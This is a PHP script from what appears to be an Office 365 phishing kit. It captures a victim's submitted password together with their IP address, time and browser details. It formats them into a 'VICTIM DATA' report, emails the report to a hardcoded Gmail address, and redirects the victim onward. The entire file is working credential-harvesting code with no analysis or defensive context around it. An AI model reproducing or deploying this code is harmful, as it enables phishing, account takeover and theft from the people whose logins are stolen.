<?php
/*
***********************************************************
*                                                         *
*                        n                                *
*             deangold@quality36                          *
*             GR33TZ TO TUNISIAN HACKERS                  *
*                                                         *
***********************************************************
*/
session_start();
require "../../FUNC/One_Time.php";
$pass1= $_POST['customerauthname'];
	if ( 
		 ($pass1 == "" || (strlen($pass1) < 8) )
       ) 
	{ 
		header('Location: ../../Error_data_entry_invalid?'.$_SESSION['_L']."&".md5(microtime())."&dispatch=".sha1(microtime()).'');
		exit; 
	} 
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
    $ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_'] = $ip = $forward;
}
else{
    $_SESSION['_ip_'] = $ip = $remote;
}
$_SESSION['_1ST_PASS']=$_POST['customerauthname'];
$t = date('H:i:s d/m/Y');
include('../FUNC/get_browser.php');
$Z118_MESSAGE .= "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #827f84;'>365 LOGIN ATTACHED FILE NEW</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #820fc4;'>LOGIN DATA</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>√</font> [+] USER_ID] = <font style='color:#0a5d00;'>".$_SESSION['_USER_']."</font><br>
<font style='color:#9c0000;'>√</font> [+] 1STPASS] = <font style='color:#0a5d00;'>".$_SESSION['_1ST_PASS']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #820fc4;'>VICTIM DATA</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>√</font> [+]IP INFO] = <font style='color:#0a5d00;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>√</font> [+]TIME/DATE] = <font style='color:#0a5d00;'>".$t."</font><br>
<font style='color:#9c0000;'>√</font> [+]User agent] = <font style='color:#0a5d00;'>".$_SERVER['HTTP_USER_AGENT']."</font><br>
################## <font style='color: #827f84;'>BY deangold@quality365.com</font> #####################
</div></html>\n";
$Z118_SUBJECT = "2ND PASS LOGIN FROM  ".$_SESSION['_ip_']."";
        $Z118_HEADERS .= "From:Dean Gold<deangold@quality365.com>";
        $Z118_HEADERS .= $_POST['eMailAdd']."\n";
        $Z118_HEADERS .= "MIME-Version: 1.0\n";
        $Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
        @mail("moneyvisionary2020@gmail.com", $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
header("Location: ../../loader/?=".$_SESSION['_L']."&".md5(microtime())."&dispatch=".sha1(microtime())."?sourcedoc={6628af3a-2983-4e57-bafd-ef8d9c0f93ef}&action=edit");
?>